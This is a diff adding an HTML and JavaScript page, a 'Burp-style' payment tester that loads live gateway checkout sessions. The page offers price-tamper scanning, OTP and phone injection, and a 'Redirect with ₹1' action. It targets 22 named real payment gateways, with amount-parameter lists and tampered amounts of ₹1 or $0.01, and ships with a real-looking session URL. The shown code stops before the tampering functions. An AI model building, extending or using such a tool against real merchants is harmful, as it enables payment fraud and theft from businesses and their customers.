@@ -1,0 +1,1466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>⌬ Archive Burp — Real-time Payment Tester</title>
+    <meta name="description" content="Burp-style payment gateway testing with real-time browser and bug detection." />
+    <meta name="robots" content="noindex, nofollow" />
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%E2%8C%AC%3C/text%3E%3C/svg%3E" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js">
+    </script>
+    <style>
+        /* ============================================================
+           BURP-STYLE DARK THEME — FULL TOOL
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0808;
+            color: #d4cdc0;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ─── TOP BAR ─── */
+        .topbar {
+            background: #0c0a0a;
+            border-bottom: 1px solid #1e1a16;
+            padding: 0.4rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            flex-wrap: wrap;
+            flex-shrink: 0;
+            min-height: 48px;
+        }
+        .topbar .brand {
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            color: #6a5f52;
+            white-space: nowrap;
+        }
+        .topbar .brand span {
+            color: #4a7a4a;
+        }
+        .topbar input {
+            flex: 1;
+            min-width: 200px;
+            background: #12100e;
+            border: 1px solid #2a2520;
+            padding: 0.35rem 0.7rem;
+            color: #d4cdc0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            border-radius: 4px;
+            outline: none;
+        }
+        .topbar input:focus {
+            border-color: #6a5f52;
+        }
+        .topbar .btn {
+            background: transparent;
+            border: 1px solid #3a322a;
+            color: #d4cdc0;
+            padding: 0.25rem 0.9rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.6rem;
+            letter-spacing: 0.8px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
+        .topbar .btn:hover:not(:disabled) {
+            background: #2a2520;
+            border-color: #6a5f52;
+        }
+        .topbar .btn.primary {
+            border-color: #5a6a4a;
+            color: #b4c4a0;
+        }
+        .topbar .btn.primary:hover:not(:disabled) {
+            background: #1e2a18;
+            border-color: #8aaa7a;
+        }
+        .topbar .btn.danger {
+            border-color: #6a3a3a;
+            color: #d48a7a;
+        }
+        .topbar .btn.danger:hover:not(:disabled) {
+            background: #2a1816;
+            border-color: #aa5a4a;
+        }
+        .topbar .btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+        .topbar .badge {
+            font-size: 0.5rem;
+            padding: 0.1rem 0.6rem;
+            border: 1px solid #3a322a;
+            border-radius: 10px;
+            color: #5a4f42;
+            background: #0c0a0a;
+            white-space: nowrap;
+        }
+        .topbar .badge.detected {
+            border-color: #4a7a4a;
+            color: #8aba8a;
+            background: #0a1a0a;
+        }
+
+        /* ─── MAIN LAYOUT ─── */
+        .main {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+            height: calc(100vh - 48px);
+        }
+
+        /* ─── LEFT: BROWSER ─── */
+        .browser-panel {
+            flex: 1;
+            background: #0a0808;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+            border-right: 1px solid #1a1612;
+        }
+        .browser-panel .browser-toolbar {
+            background: #0c0a0a;
+            border-bottom: 1px solid #1a1612;
+            padding: 0.2rem 0.6rem;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            flex-shrink: 0;
+            min-height: 30px;
+        }
+        .browser-panel .browser-toolbar .url-display {
+            flex: 1;
+            font-size: 0.6rem;
+            color: #5a4f42;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            padding: 0.1rem 0.4rem;
+            background: #12100e;
+            border-radius: 3px;
+            border: 1px solid #1e1a16;
+        }
+        .browser-panel .browser-toolbar .btn-sm {
+            background: transparent;
+            border: 1px solid #2a2520;
+            color: #5a4f42;
+            padding: 0.1rem 0.5rem;
+            font-size: 0.5rem;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .browser-panel .browser-toolbar .btn-sm:hover {
+            background: #1a1612;
+            border-color: #4a4a3a;
+        }
+        .browser-frame {
+            flex: 1;
+            background: #ffffff;
+            position: relative;
+            min-height: 200px;
+        }
+        .browser-frame iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: #ffffff;
+        }
+        .browser-frame .overlay-msg {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #5a4f42;
+            font-size: 0.8rem;
+            pointer-events: none;
+            text-align: center;
+        }
+        .browser-frame .overlay-msg .icon {
+            font-size: 2rem;
+            display: block;
+            margin-bottom: 0.3rem;
+        }
+
+        /* ─── RIGHT: REQUEST PANEL ─── */
+        .request-panel {
+            width: 420px;
+            min-width: 300px;
+            max-width: 50vw;
+            background: #0c0a0a;
+            display: flex;
+            flex-direction: column;
+            border-left: 1px solid #1a1612;
+            overflow: hidden;
+        }
+        .request-panel .panel-tabs {
+            display: flex;
+            border-bottom: 1px solid #1a1612;
+            flex-shrink: 0;
+            background: #0a0808;
+        }
+        .request-panel .panel-tabs .tab {
+            padding: 0.3rem 0.8rem;
+            font-size: 0.55rem;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: #5a4f42;
+            border-bottom: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: transparent;
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            font-family: 'Courier New', monospace;
+        }
+        .request-panel .panel-tabs .tab:hover {
+            color: #8a7f6e;
+        }
+        .request-panel .panel-tabs .tab.active {
+            color: #d4cdc0;
+            border-bottom-color: #4a7a4a;
+        }
+        .request-panel .panel-content {
+            flex: 1;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .request-panel .panel-content .tab-content {
+            display: none;
+            flex: 1;
+            overflow: auto;
+            padding: 0.6rem;
+            flex-direction: column;
+        }
+        .request-panel .panel-content .tab-content.active {
+            display: flex;
+        }
+
+        /* ─── REQUEST VIEWER ─── */
+        .request-viewer {
+            font-size: 0.65rem;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            line-height: 1.5;
+            color: #b4a8a0;
+            background: #0a0808;
+            padding: 0.5rem;
+            border-radius: 3px;
+            border: 1px solid #1a1612;
+            flex: 1;
+            overflow: auto;
+            min-height: 80px;
+        }
+        .request-viewer .method {
+            color: #8aba8a;
+        }
+        .request-viewer .url {
+            color: #8ab4c4;
+        }
+        .request-viewer .header {
+            color: #caca8a;
+        }
+        .request-viewer .param {
+            color: #d48a7a;
+        }
+        .request-viewer .value {
+            color: #b4a8a0;
+        }
+
+        /* ─── MANUAL INPUTS ─── */
+        .input-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.4rem;
+            margin: 0.3rem 0;
+        }
+        .input-group label {
+            font-size: 0.55rem;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: #5a4f42;
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+            min-width: 60px;
+        }
+        .input-group input,
+        .input-group select {
+            background: #12100e;
+            border: 1px solid #2a2520;
+            padding: 0.2rem 0.5rem;
+            color: #d4cdc0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.6rem;
+            border-radius: 3px;
+            outline: none;
+            flex: 1;
+            min-width: 60px;
+        }
+        .input-group input:focus,
+        .input-group select:focus {
+            border-color: #6a5f52;
+        }
+        .input-group .btn-sm {
+            background: transparent;
+            border: 1px solid #3a322a;
+            color: #d4cdc0;
+            padding: 0.15rem 0.6rem;
+            font-size: 0.5rem;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .input-group .btn-sm:hover {
+            background: #2a2520;
+            border-color: #6a5f52;
+        }
+        .input-group .btn-sm.success {
+            border-color: #4a7a4a;
+            color: #8aba8a;
+        }
+        .input-group .btn-sm.success:hover {
+            background: #0a1a0a;
+        }
+        .input-group .btn-sm.danger {
+            border-color: #6a3a3a;
+            color: #d48a7a;
+        }
+        .input-group .btn-sm.danger:hover {
+            background: #2a1816;
+        }
+
+        /* ─── BUG DETECTION OUTPUT ─── */
+        .bug-output {
+            font-size: 0.6rem;
+            background: #0a0808;
+            border: 1px solid #1a1612;
+            border-radius: 3px;
+            padding: 0.4rem;
+            max-height: 120px;
+            overflow: auto;
+            margin-top: 0.3rem;
+            line-height: 1.6;
+        }
+        .bug-output .success {
+            color: #8aba8a;
+        }
+        .bug-output .fail {
+            color: #d48a7a;
+        }
+        .bug-output .info {
+            color: #8ab4c4;
+        }
+        .bug-output .warn {
+            color: #caca8a;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 0.05rem 0.5rem;
+            border-radius: 10px;
+            font-size: 0.5rem;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            border: 1px solid #3a322a;
+        }
+        .status-badge.success {
+            border-color: #4a7a4a;
+            color: #8aba8a;
+            background: #0a1a0a;
+        }
+        .status-badge.fail {
+            border-color: #6a3a3a;
+            color: #d48a7a;
+            background: #1a0a0a;
+        }
+        .status-badge.pending {
+            border-color: #6a6a3a;
+            color: #caca8a;
+            background: #1a1a0a;
+        }
+        .status-badge.info {
+            border-color: #3a5a6a;
+            color: #8ab4c4;
+            background: #0a1a1a;
+        }
+
+        /* ─── TOAST ─── */
+        .toast-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 0.4rem;
+            max-width: 320px;
+            width: calc(100% - 40px);
+        }
+        .toast {
+            background: #1a1612;
+            border: 1px solid #3a322a;
+            padding: 0.5rem 0.8rem;
+            border-radius: 5px;
+            font-size: 0.6rem;
+            color: #d4cdc0;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.8);
+            animation: slideIn 0.25s ease-out;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .toast.success {
+            border-left: 3px solid #4a7a4a;
+        }
+        .toast.error {
+            border-left: 3px solid #6a3a3a;
+        }
+        .toast.info {
+            border-left: 3px solid #3a5a6a;
+        }
+        .toast.warning {
+            border-left: 3px solid #6a6a3a;
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        .toast .toast-close {
+            background: none;
+            border: none;
+            color: #5a4f42;
+            cursor: pointer;
+            font-size: 0.9rem;
+            margin-left: auto;
+            padding: 0 3px;
+        }
+        .toast .toast-close:hover {
+            color: #d4cdc0;
+        }
+
+        /* ─── SCROLLBARS ─── */
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0a0808;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2a2520;
+            border-radius: 4px;
+        }
+
+        /* ─── RESPONSIVE ─── */
+        @media (max-width: 820px) {
+            .main {
+                flex-direction: column;
+                height: auto;
+            }
+            .request-panel {
+                width: 100%;
+                max-width: 100%;
+                border-left: none;
+                border-top: 1px solid #1a1612;
+                min-height: 300px;
+                max-height: 50vh;
+            }
+            .browser-frame {
+                min-height: 300px;
+            }
+            .topbar {
+                padding: 0.3rem 0.6rem;
+                gap: 0.4rem;
+            }
+            .topbar .brand {
+                font-size: 0.6rem;
+            }
+            .topbar input {
+                font-size: 0.6rem;
+                min-width: 100px;
+            }
+            .topbar .btn {
+                font-size: 0.5rem;
+                padding: 0.15rem 0.6rem;
+            }
+        }
+        @media (max-width: 500px) {
+            .topbar .brand {
+                display: none;
+            }
+            .topbar input {
+                min-width: 60px;
+                font-size: 0.5rem;
+                padding: 0.2rem 0.4rem;
+            }
+            .request-panel {
+                min-height: 200px;
+                max-height: 40vh;
+            }
+            .browser-frame {
+                min-height: 200px;
+            }
+            .input-group {
+                flex-direction: column;
+                gap: 0.2rem;
+            }
+            .input-group label {
+                min-width: auto;
+            }
+        }
+
+        /* ─── QR POPUP ─── */
+        .qr-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #0c0a0a;
+            border: 1px solid #3a322a;
+            padding: 1.5rem;
+            border-radius: 8px;
+            box-shadow: 0 0 60px rgba(0, 0, 0, 0.9);
+            z-index: 999;
+            display: none;
+            text-align: center;
+            min-width: 200px;
+        }
+        .qr-popup.show {
+            display: block;
+        }
+        .qr-popup .close-btn {
+            position: absolute;
+            top: 6px;
+            right: 10px;
+            background: none;
+            border: none;
+            color: #5a4f42;
+            font-size: 1.2rem;
+            cursor: pointer;
+        }
+        .qr-popup .close-btn:hover {
+            color: #d4cdc0;
+        }
+        .qr-popup .label {
+            font-size: 0.55rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #5a4f42;
+            margin-bottom: 0.5rem;
+        }
+        .qr-popup #qrPopupContainer {
+            display: inline-block;
+            background: white;
+            padding: 8px;
+            border-radius: 4px;
+        }
+        .qr-popup #qrPopupContainer canvas,
+        .qr-popup #qrPopupContainer img {
+            display: block !important;
+            margin: 0 auto;
+        }
+        .qr-popup .upi-id {
+            margin-top: 0.5rem;
+            font-size: 0.7rem;
+            color: #8a7f6e;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ─── TOP BAR ─── -->
+    <div class="topbar">
+        <div class="brand">⌬ <span>BURP</span>·ARCHIVE</div>
+        <input type="url" id="urlInput" placeholder="https://api.cashfree.com/pg/view/gateway/session_..." value="https://api.cashfree.com/pg/view/gateway/session_oWgYiSE3todrLLHMDfhFuv6YVVECawv8PZwK668R5TxF1XpmIIYaFKHddMgtgkYLZsY1x4Nl8S1HNk7o0sj_oVPDKqnuprifZyQ4s7rzANI2WO0OnUxtSSKMTG4paymentCH-20260730-113510-L9ZU01" />
+        <button class="btn primary" id="loadBtn">⟳ Load</button>
+        <button class="btn" id="reloadBtn">⟲ Reload</button>
+        <span class="badge" id="gatewayBadge">⏳ detecting...</span>
+        <span style="font-size:0.5rem;color:#3a352a;" id="statusText">ready</span>
+    </div>
+
+    <!-- ─── MAIN ─── -->
+    <div class="main">
+
+        <!-- ─── LEFT: BROWSER ─── -->
+        <div class="browser-panel">
+            <div class="browser-toolbar">
+                <span style="font-size:0.5rem;color:#3a352a;">📍</span>
+                <span class="url-display" id="currentUrlDisplay">https://...</span>
+                <button class="btn-sm" id="goBackBtn">◀</button>
+                <button class="btn-sm" id="goForwardBtn">▶</button>
+                <button class="btn-sm" id="refreshFrameBtn">⟲</button>
+            </div>
+            <div class="browser-frame" id="browserFrame">
+                <iframe id="gatewayFrame" sandbox="allow-scripts allow-forms allow-same-origin allow-popups"></iframe>
+                <div class="overlay-msg" id="frameOverlay">
+                    <span class="icon">⌬</span>
+                    Load a gateway URL to begin<br/>
+                    <span style="font-size:0.6rem;color:#3a352a;">OTP, phone, and params can be injected manually</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ─── RIGHT: REQUEST PANEL ─── -->
+        <div class="request-panel">
+
+            <!-- Tabs -->
+            <div class="panel-tabs">
+                <button class="tab active" data-tab="params">Params</button>
+                <button class="tab" data-tab="headers">Headers</button>
+                <button class="tab" data-tab="bugs">Bugs</button>
+                <button class="tab" data-tab="manual">Manual</button>
+            </div>
+
+            <!-- Content -->
+            <div class="panel-content">
+
+                <!-- ─── PARAMS TAB ─── -->
+                <div class="tab-content active" id="tabParams">
+                    <div style="font-size:0.55rem;color:#5a4f42;margin-bottom:0.2rem;">Detected parameters from URL</div>
+                    <div class="request-viewer" id="paramsViewer" style="min-height:60px;max-height:200px;">
+                        <span style="color:#5a4f42;">No parameters detected yet</span>
+                    </div>
+                    <div style="margin-top:0.3rem;">
+                        <div style="font-size:0.55rem;color:#5a4f42;">Amount: <span id="detectedAmount" style="color:#8aba8a;">—</span></div>
+                        <div style="font-size:0.55rem;color:#5a4f42;">Session: <span id="detectedSession" style="color:#8ab4c4;">—</span></div>
+                        <div style="font-size:0.55rem;color:#5a4f42;">Gateway: <span id="detectedGatewayName" style="color:#caca8a;">—</span></div>
+                    </div>
+                </div>
+
+                <!-- ─── HEADERS TAB ─── -->
+                <div class="tab-content" id="tabHeaders">
+                    <div style="font-size:0.55rem;color:#5a4f42;margin-bottom:0.2rem;">Request/Response headers</div>
+                    <div class="request-viewer" id="headersViewer" style="min-height:60px;max-height:200px;">
+                        <span style="color:#5a4f42;">Headers will appear here</span>
+                    </div>
+                </div>
+
+                <!-- ─── BUGS TAB ─── -->
+                <div class="tab-content" id="tabBugs">
+                    <div style="display:flex;gap:0.4rem;flex-wrap:wrap;margin-bottom:0.3rem;">
+                        <button class="btn-sm success" id="scanC2SBtn">⤷ Scan C2S</button>
+                        <button class="btn-sm danger" id="scanTamperBtn">⤷ Scan Price Tamper</button>
+                        <button class="btn-sm" id="scanAllBtn">⤷ Full Scan</button>
+                    </div>
+                    <div class="bug-output" id="bugOutput">
+                        <span style="color:#5a4f42;">Click a scan button to start</span>
+                    </div>
+                </div>
+
+                <!-- ─── MANUAL TAB ─── -->
+                <div class="tab-content" id="tabManual">
+                    <div style="font-size:0.55rem;color:#5a4f42;margin-bottom:0.2rem;">Manual injection — OTP, phone, custom params</div>
+
+                    <div class="input-group">
+                        <label>OTP</label>
+                        <input type="text" id="manualOtp" placeholder="123456" />
+                        <button class="btn-sm success" id="injectOtpBtn">Inject</button>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Phone</label>
+                        <input type="text" id="manualPhone" placeholder="9876543210" />
+                        <button class="btn-sm success" id="injectPhoneBtn">Inject</button>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Custom</label>
+                        <input type="text" id="manualKey" placeholder="param" style="flex:0.5;min-width:40px;" />
+                        <input type="text" id="manualValue" placeholder="value" style="flex:1;" />
+                        <button class="btn-sm success" id="injectCustomBtn">+ Add</button>
+                    </div>
+
+                    <div style="font-size:0.55rem;color:#5a4f42;margin-top:0.2rem;">Injected params will appear in URL</div>
+                    <div class="request-viewer" id="injectedViewer" style="min-height:40px;max-height:80px;font-size:0.55rem;">
+                        <span style="color:#5a4f42;">No injections yet</span>
+                    </div>
+
+                    <div class="input-group" style="margin-top:0.3rem;">
+                        <label>Payment</label>
+                        <select id="paymentMethodSelect">
+                            <option value="upi">UPI</option>
+                            <option value="card">Card</option>
+                            <option value="netbanking">NetBanking</option>
+                            <option value="wallet">Wallet</option>
+                        </select>
+                        <button class="btn-sm success" id="redirectWithTamperBtn">⤷ Redirect with ₹1</button>
+                        <button class="btn-sm" id="showQrBtn">⤷ Show QR/UPI</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ─── QR POPUP ─── -->
+    <div class="qr-popup" id="qrPopup">
+        <button class="close-btn" id="qrPopupClose">&times;</button>
+        <div class="label">⬡ UPI QR</div>
+        <div id="qrPopupContainer"></div>
+        <div class="upi-id" id="qrPopupUpiId">UPI: merchant@upi</div>
+        <div style="font-size:0.6rem;color:#5a4f42;margin-top:0.3rem;" id="qrPopupAmount">₹ 0.00</div>
+    </div>
+
+    <!-- ─── TOAST ─── -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script>
+        /* ==============================================================
+           BURP-STYLE TOOL — Real-time Browser + Bug Detection
+           ============================================================== */
+
+        (function() {
+            'use strict';
+
+            // ─── DOM REFS ───
+            const urlInput = document.getElementById('urlInput');
+            const loadBtn = document.getElementById('loadBtn');
+            const reloadBtn = document.getElementById('reloadBtn');
+            const gatewayFrame = document.getElementById('gatewayFrame');
+            const currentUrlDisplay = document.getElementById('currentUrlDisplay');
+            const frameOverlay = document.getElementById('frameOverlay');
+            const gatewayBadge = document.getElementById('gatewayBadge');
+            const statusText = document.getElementById('statusText');
+            const goBackBtn = document.getElementById('goBackBtn');
+            const goForwardBtn = document.getElementById('goForwardBtn');
+            const refreshFrameBtn = document.getElementById('refreshFrameBtn');
+
+            const paramsViewer = document.getElementById('paramsViewer');
+            const headersViewer = document.getElementById('headersViewer');
+            const bugOutput = document.getElementById('bugOutput');
+            const injectedViewer = document.getElementById('injectedViewer');
+
+            const detectedAmount = document.getElementById('detectedAmount');
+            const detectedSession = document.getElementById('detectedSession');
+            const detectedGatewayName = document.getElementById('detectedGatewayName');
+
+            const manualOtp = document.getElementById('manualOtp');
+            const manualPhone = document.getElementById('manualPhone');
+            const manualKey = document.getElementById('manualKey');
+            const manualValue = document.getElementById('manualValue');
+            const injectOtpBtn = document.getElementById('injectOtpBtn');
+            const injectPhoneBtn = document.getElementById('injectPhoneBtn');
+            const injectCustomBtn = document.getElementById('injectCustomBtn');
+            const redirectWithTamperBtn = document.getElementById('redirectWithTamperBtn');
+            const showQrBtn = document.getElementById('showQrBtn');
+            const paymentMethodSelect = document.getElementById('paymentMethodSelect');
+
+            const scanC2SBtn = document.getElementById('scanC2SBtn');
+            const scanTamperBtn = document.getElementById('scanTamperBtn');
+            const scanAllBtn = document.getElementById('scanAllBtn');
+
+            const qrPopup = document.getElementById('qrPopup');
+            const qrPopupClose = document.getElementById('qrPopupClose');
+            const qrPopupContainer = document.getElementById('qrPopupContainer');
+            const qrPopupUpiId = document.getElementById('qrPopupUpiId');
+            const qrPopupAmount = document.getElementById('qrPopupAmount');
+
+            const toastContainer = document.getElementById('toastContainer');
+
+            // ─── TABS ───
+            document.querySelectorAll('.tab').forEach(function(tab) {
+                tab.addEventListener('click', function() {
+                    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+                    this.classList.add('active');
+                    document.querySelectorAll('.tab-content').forEach(function(tc) { tc.classList.remove(
+                        'active'); });
+                    document.getElementById('tab' + this.dataset.tab.charAt(0).toUpperCase() + this.dataset.tab
+                        .slice(1)).classList.add('active');
+                });
+            });
+
+            // ─── TOAST ───
+            function showToast(msg, type) {
+                type = type || 'info';
+                var t = document.createElement('div');
+                t.className = 'toast ' + type;
+                t.innerHTML = '<span>' + msg + '</span><button class="toast-close">&times;</button>';
+                toastContainer.appendChild(t);
+                t.querySelector('.toast-close').addEventListener('click', function() { t.remove(); });
+                setTimeout(function() { if (t.parentNode) t.remove(); }, 5000);
+            }
+
+            function setStatus(text, type) {
+                statusText.textContent = text;
+                statusText.style.color = type === 'error' ? '#6a3a3a' : type === 'success' ? '#4a7a4a' : '#3a352a';
+            }
+
+            // ─── GATEWAY DATABASE ───
+            var GATEWAYS = [{
+                id: 'razorpay',
+                name: 'Razorpay',
+                patterns: [/razorpay\.com/i, /api\.razorpay\.com/i, /payment_link_/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'razorpay@upi',
+                supportsQr: true
+            }, {
+                id: 'payu',
+                name: 'PayU India',
+                patterns: [/payu\.in/i, /payumoney\.com/i, /icpcheckout/i, /purchaseQuantity/i],
+                amountParams: ['amount', 'txnAmount', 'purchaseQuantity', 'price'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'payu@upi',
+                supportsQr: true
+            }, {
+                id: 'ccavenue',
+                name: 'CCAvenue',
+                patterns: [/ccavenue\.com/i, /ccavenu\.in/i, /cart\/checkout/i],
+                amountParams: ['amount', 'price', 'total', 'MerchantAmount'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'ccavenue@upi',
+                supportsQr: true
+            }, {
+                id: 'instamojo',
+                name: 'Instamojo',
+                patterns: [/instamojo\.com/i, /api\.instamojo\.com/i, /payment_requests/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'instamojo@upi',
+                supportsQr: true
+            }, {
+                id: 'phonepe',
+                name: 'PhonePe',
+                patterns: [/phonepe\.com/i, /pg\.phonepe\.com/i, /pg\/v1\/pay/i],
+                amountParams: ['amount', 'txnAmount', 'total'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'phonepe@upi',
+                supportsQr: true
+            }, {
+                id: 'googlepay',
+                name: 'Google Pay',
+                patterns: [/pay\.google\.com/i, /googlepay/i, /gpay/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'gpay@upi',
+                supportsQr: true
+            }, {
+                id: 'paytm',
+                name: 'Paytm',
+                patterns: [/paytm\.com/i, /paytm\.in/i, /theia\/api/i, /initiateTransaction/i],
+                amountParams: ['amount', 'txnAmount', 'total', 'price'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'paytm@upi',
+                supportsQr: true
+            }, {
+                id: 'cashfree',
+                name: 'Cashfree',
+                patterns: [/cashfree\.com/i, /api\.cashfree\.com/i, /pg\/view\/gateway/i, /session_/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'cashfree@upi',
+                supportsQr: false
+            }, {
+                id: 'stripe',
+                name: 'Stripe',
+                patterns: [/stripe\.com/i, /api\.stripe\.com/i, /payment_intents/i],
+                amountParams: ['amount', 'price', 'total', 'unit_amount'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: 'stripe@upi',
+                supportsQr: false
+            }, {
+                id: 'paypal',
+                name: 'PayPal',
+                patterns: [/paypal\.com/i, /api\.paypal\.com/i, /v2\/checkout\/orders/i],
+                amountParams: ['amount', 'total', 'price', 'value'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: 'paypal@upi',
+                supportsQr: false
+            }, {
+                id: 'braintree',
+                name: 'Braintree',
+                patterns: [/braintree\.com/i, /api\.braintree/i, /merchants\/.*\/transactions/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: 'braintree@upi',
+                supportsQr: false
+            }, {
+                id: 'adyen',
+                name: 'Adyen',
+                patterns: [/adyen\.com/i, /api\.adyen\.com/i, /\/payments/i],
+                amountParams: ['amount', 'price', 'total', 'value'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: 'adyen@upi',
+                supportsQr: false
+            }, {
+                id: 'worldpay',
+                name: 'Worldpay',
+                patterns: [/worldpay\.com/i, /api\.worldpay\.com/i, /\/payments/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: 'worldpay@upi',
+                supportsQr: false
+            }, {
+                id: '2checkout',
+                name: '2Checkout',
+                patterns: [/2checkout\.com/i, /api\.2checkout\.com/i, /\/api\/checkout/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: '2checkout@upi',
+                supportsQr: false
+            }, {
+                id: 'square',
+                name: 'Square',
+                patterns: [/square\.com/i, /api\.squareup\.com/i, /v2\/payments/i],
+                amountParams: ['amount', 'total', 'price'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: 'square@upi',
+                supportsQr: false
+            }, {
+                id: 'klarna',
+                name: 'Klarna',
+                patterns: [/klarna\.com/i, /api\.klarna\.com/i, /payments\/v1\/orders/i],
+                amountParams: ['amount', 'total', 'price', 'order_amount'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: 'klarna@upi',
+                supportsQr: false
+            }, {
+                id: 'afterpay',
+                name: 'Afterpay',
+                patterns: [/afterpay\.com/i, /api\.afterpay\.com/i, /v2\/orders/i],
+                amountParams: ['amount', 'total', 'price'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: 'afterpay@upi',
+                supportsQr: false
+            }, {
+                id: 'bluesnap',
+                name: 'BlueSnap',
+                patterns: [/bluesnap\.com/i, /api\.bluesnap\.com/i, /services\/2\/payments/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'USD',
+                testAmount: 0.01,
+                upiMerchant: 'bluesnap@upi',
+                supportsQr: false
+            }, {
+                id: 'juspay',
+                name: 'Juspay',
+                patterns: [/juspay\.in/i, /api\.juspay\.in/i, /juspay\.pay/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'juspay@upi',
+                supportsQr: true
+            }, {
+                id: 'easebuzz',
+                name: 'Easebuzz',
+                patterns: [/easebuzz\.in/i, /api\.easebuzz\.in/i, /easybuzz\/pay/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'easebuzz@upi',
+                supportsQr: true
+            }, {
+                id: 'pinelabs',
+                name: 'Pine Labs',
+                patterns: [/pinelabs\.com/i, /api\.pinelabs\.com/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'pinelabs@upi',
+                supportsQr: false
+            }, {
+                id: 'billdesk',
+                name: 'BillDesk',
+                patterns: [/billdesk\.com/i, /billdesk\.in/i, /pg\/billdesk/i],
+                amountParams: ['amount', 'price', 'total'],
+                currency: 'INR',
+                testAmount: 1.00,
+                upiMerchant: 'billdesk@upi',
+                supportsQr: false
+            }];
+
+            // ─── STATE ───
+            var state = {
+                url: '',
+                sessionId: '',
+                detectedGateway: null,
+                originalAmount: null,
+                currency: 'INR',
+                tamperedAmount: 1.00,
+                isTampered: false,
+                c2sSuccess: false,
+                c2sTested: false,
+                injectedParams: {},
+                history: [],
+                historyIndex: -1
+            };
+
